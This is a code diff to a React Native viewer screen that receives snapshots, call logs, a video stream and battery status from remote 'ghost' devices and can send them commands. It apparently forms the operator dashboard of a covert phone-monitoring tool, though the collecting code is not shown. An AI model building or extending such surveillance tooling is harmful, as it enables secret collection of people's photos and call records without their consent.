@@ -43,9 +43,33 @@ const ViewerScreen = ({ onLogout, name, allowedNodes = [], onShowGuide }) => {
       }
     });
 
+    socket.on('ghost_activity', (payload) => {
+      const lowerName = payload.name.toLowerCase();
+      if (!assignedNodesRef.current.includes(lowerName)) return;
+
+      if (payload.type === 'SNAPSHOT') {
+        setGhosts(prev => ({
+          ...prev,
+          [lowerName]: {
+            ...prev[lowerName],
+            snapshots: [{ id: Date.now().toString(), uri: payload.data, timestamp: new Date().toLocaleTimeString() }, ...(prev[lowerName]?.snapshots || [])]
+          }
+        }));
+      } else if (payload.type === 'LOG_SYNC') {
+        setGhosts(prev => ({
+          ...prev,
+          [lowerName]: {
+            ...prev[lowerName],
+            callLogs: payload.data
+          }
+        }));
+      }
+    });
+
     return () => {
       socket.off('heartbeat_update');
       socket.off('ghost_online');
+      socket.off('ghost_activity');
     };
   }, []);
 
@@ -119,13 +143,35 @@ const ViewerScreen = ({ onLogout, name, allowedNodes = [], onShowGuide }) => {
                   
                   {ghost ? (
                     <View style={styles.dataArea}>
-                      <View style={styles.statsRow}>
-                        <StatusCard 
-                          battery={ghost.battery} 
-                          connection={ghost.status} 
-                          isCharging={ghost.isCharging} 
-                        />
+                      <View style={styles.vitalsGrid}>
+                        <View style={[styles.gridCell, { borderLeftWidth: 0, borderTopWidth: 0 }]}>
+                          <View style={styles.cellIconBox}>
+                            <MaterialCommunityIcons 
+                              name={ghost?.isCharging ? "battery-charging" : "battery"} 
+                              size={14} 
+                              color="#10B981" 
+                            />
+                          </View>
+                          <View>
+                            <Text style={styles.cellLabel}>ENERGY</Text>
+                            <Text style={styles.cellVal}>{ghost?.battery || '--%'}</Text>
+                          </View>
+                        </View>
+                        <View style={[styles.gridCell, { borderTopWidth: 0 }]}>
+                          <View style={[styles.cellIconBox, { backgroundColor: 'rgba(56, 189, 248, 0.1)' }]}>
+                            <MaterialCommunityIcons name="radar" size={14} color="#38BDF8" />
+                          </View>
+                          <View>
+                            <Text style={styles.cellLabel}>SIGNAL</Text>
+                            <Text style={styles.cellVal}>{ghost?.status || 'CONNECTED'}</Text>
+                          </View>
+                        </View>
                       </View>
+                      
+                      <TouchableOpacity style={styles.resyncBtn} onPress={() => sendCommand(nodeName, 'PING')}>
+                        <MaterialCommunityIcons name="sync" size={14} color="#38BDF8" style={{marginRight: 8}} />
+                        <Text style={styles.resyncBtnText}>RE-SYNC TELEMETRY</Text>
+                      </TouchableOpacity>
                       
                       <View style={styles.feedColumn}>
                         <Text style={styles.sectionLabel}>SECURE VIDEO STREAM</Text>
@@ -202,8 +248,16 @@ const styles = StyleSheet.create({
   dotGreen: { backgroundColor: '#10B981' },
   dotRed: { backgroundColor: '#EF4444' },
 
-  dataArea: { gap: 20 },
-  statsRow: { alignItems: 'flex-start' },
+  dataArea: { gap: 16 },
+  vitalsGrid: { flexDirection: 'row', flexWrap: 'wrap', backgroundColor: '#0F172A', borderRadius: 12, borderWidth: 1, borderColor: '#334155', overflow: 'hidden' },
+  gridCell: { width: '50%', flexDirection: 'row', alignItems: 'center', padding: 10, borderLeftWidth: 1, borderTopWidth: 1, borderColor: '#334155' },
+  cellIconBox: { width: 28, height: 28, borderRadius: 6, backgroundColor: 'rgba(16, 185, 129, 0.1)', justifyContent: 'center', alignItems: 'center', marginRight: 8 },
+  cellLabel: { color: '#64748B', fontSize: 7, fontWeight: '700', letterSpacing: 0.5 },
+  cellVal: { color: '#F8FAFC', fontSize: 10, fontWeight: '800', marginTop: 1 },
+  
+  resyncBtn: { height: 36, flexDirection: 'row', justifyContent: 'center', alignItems: 'center', borderRadius: 18, backgroundColor: 'rgba(56, 189, 248, 0.05)', borderWidth: 1, borderColor: 'rgba(56, 189, 248, 0.2)' },
+  resyncBtnText: { color: '#38BDF8', fontSize: 10, fontWeight: '700', letterSpacing: 0.8 },
+
   sectionLabel: { color: '#64748B', fontSize: 10, fontWeight: '700', letterSpacing: 1.5, marginBottom: 8, marginLeft: 4 },
   
   offlineBox: { height: 200, justifyContent: 'center', alignItems: 'center', backgroundColor: '#0F172A', borderRadius: 12, borderWidth: 1, borderColor: '#334155' },
